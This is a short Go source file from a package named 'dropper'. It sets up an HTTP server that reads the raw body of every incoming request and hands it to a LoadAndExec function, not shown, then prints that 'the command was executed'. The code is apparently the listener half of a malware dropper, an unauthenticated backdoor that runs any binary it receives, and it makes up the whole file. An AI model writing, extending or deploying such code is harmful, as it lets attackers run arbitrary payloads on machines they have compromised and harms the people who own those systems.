package dropper

import (
	"fmt"
	"io/ioutil"
	"net/http"
)

func IncomingPostRequest(w http.ResponseWriter, r *http.Request) {
	// this function is called when a POST request is received
	// that sends a file to the dropper and returns the []byte of the file
	// we will be using the dropper package to get the file
	// we will be using the ioutil package to read the file

	// first get the binary data from the post request
	b, err := ioutil.ReadAll(r.Body)
	if err != nil {
		fmt.Print(err)
	}
	defer r.Body.Close()

	// second get the file from the dropper

	err = LoadAndExec(b)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Printf("[*] The command was executed \n")
}

func WriteServer(port string) {
	http.HandleFunc("/", IncomingPostRequest)
	http.ListenAndServe(port, nil)

}
